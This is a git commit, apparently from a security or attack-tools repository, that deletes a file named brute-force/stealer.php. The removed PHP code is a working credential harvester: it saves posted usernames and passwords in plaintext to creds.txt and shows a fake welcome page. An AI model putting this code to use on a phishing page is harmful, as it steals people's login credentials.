7e9eff2b41cfd307d24b4b5301debf99254a4e06
akkigit97 <98334427+akkigit97@users.noreply.github.com>
2025-04-18 15:30:05 +0100

    Delete brute-force/stealer.php

--- brute-force/stealer.php
+++
@@ -1,9 +0,0 @@
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-  $user = $_POST["username"];
-  $pass = $_POST["password"];
-  $creds = "Username: $user | Password: $pass\n";
-  file_put_contents("creds.txt", $creds, FILE_APPEND);
-  echo "Welcome, $user!";
-}
-?>
